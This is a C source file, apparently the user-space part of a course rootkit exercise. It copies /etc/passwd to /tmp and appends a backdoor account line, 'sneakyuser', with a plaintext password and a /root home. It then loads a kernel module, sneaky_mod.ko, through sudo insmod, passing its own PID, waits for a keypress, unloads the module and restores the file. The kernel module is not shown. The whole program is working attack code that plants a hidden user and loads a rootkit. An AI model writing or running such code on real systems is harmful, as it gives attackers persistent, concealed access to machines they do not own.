#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>

void cpPasswd(char *srcPath, char *destPath) {
    FILE *srcFile, *destFile;

    // Open the source file for reading
    srcFile = fopen(srcPath, "rb");
    if (srcFile == NULL) {
        printf("Error opening source file.\n");
        exit(EXIT_FAILURE);
    }

    // Create the destination file for writing
    destFile = fopen(destPath, "wb");
    if (destFile == NULL) {
        printf("Error creating destination file.\n");
        fclose(srcFile);
        exit(EXIT_FAILURE);
    }

    // Copy the contents of the source file to the destination file
    char buffer[1024];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), srcFile)) > 0) {
        fwrite(buffer, 1, bytesRead, destFile);
    }

    // Close the files
    fclose(srcFile);
    fclose(destFile);
}

void addSneakyUser(char *filePath, char *sneakyuser) {
    FILE *file = fopen(filePath, "a");
    if (file == NULL) {
        printf("Error opening file to add sneaky user.\n");
        exit(EXIT_FAILURE);
    }

    fprintf(file, "%s\n", sneakyuser);

    fclose(file);
}

int main(int argc, char *argv[]) {
    // 1. print pid
    printf("sneaky_process pid = %d\n", getpid());

    char *etcPasswd = "/etc/passwd";
    char *tmpPasswd = "/tmp/passwd";
    // 2. copy passwd from etc to tep and add sneakyuser
    cpPasswd("/etc/passwd", "/tmp/passwd");
    cpPasswd(etcPasswd, tmpPasswd);
    addSneakyUser(etcPasswd,
                  "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");

    // 3. load the sneaky module (sneaky_mod.ko) using the “insmod” command
    char procIDCom[50];
    sprintf(procIDCom, "sudo insmod sneaky_mod.ko sp_pid=%d",
            getpid());
    // printf("%s", procIDCom);
    system(procIDCom);

    // 4. enter a loop, reading a character at a time from the keyboard input
    // until it receives the character ‘q’ (for quit)
    struct termios term, term_orig;

    // Save the terminal settings
    tcgetattr(STDIN_FILENO, &term);
    term_orig = term;

    // Set the terminal to raw mode
    term.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &term);

    char c;
    while ((c = getchar()) != 'q') {
    }

    // Restore the original terminal settings
    tcsetattr(STDIN_FILENO, TCSANOW, &term_orig);

    // 5. unload the sneaky kernel module using the “rmmod” command
    system("sudo rmmod sneaky_mod.ko");

    // 6. restore the /etc/passwd file (and remove the addition of “sneakyuser”
    // authentication information) by copying /tmp/passwd to /etc/passwd.
    cpPasswd(tmpPasswd, etcPasswd);
    remove(tmpPasswd);

    return EXIT_SUCCESS;
}